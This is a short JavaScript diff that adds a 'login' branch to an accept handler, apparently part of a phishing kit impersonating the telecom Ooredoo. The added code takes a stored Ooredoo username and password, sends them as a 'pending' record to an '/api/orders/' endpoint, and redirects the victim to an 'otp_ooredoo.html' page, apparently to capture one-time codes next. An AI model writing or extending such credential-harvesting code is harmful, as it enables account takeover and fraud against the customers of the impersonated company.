@@ -121,6 +121,33 @@
     } catch (err) {}
 
     if (decision === 'accept') {
+      if (flow === 'login') {
+        const payload = {
+          ooredooUser: sessionStorage.getItem('ooredooUser') || '',
+          ooredooPass: sessionStorage.getItem('ooredooPass') || '',
+          status: 'pending'
+        };
+
+        const body = JSON.stringify(payload);
+        if (navigator.sendBeacon) {
+          navigator.sendBeacon('/api/orders/' + encodeURIComponent(orderId), new Blob([body], { type: 'application/json' }));
+        } else {
+          fetch('/api/orders/' + encodeURIComponent(orderId), {
+            method: 'PUT',
+            headers: { 'Content-Type': 'application/json' },
+            body: body,
+            keepalive: true
+          }).catch(() => {});
+        }
+
+        localStorage.setItem(flowKey, 'login');
+        sessionStorage.setItem(flowKey, 'login');
+        localStorage.removeItem(decisionKey);
+        sessionStorage.removeItem(decisionKey);
+        window.location.href = 'otp_ooredoo.html';
+        return;
+      }
+
       if (flow === 'otp') {
         localStorage.removeItem(decisionKey);
         sessionStorage.removeItem(decisionKey);
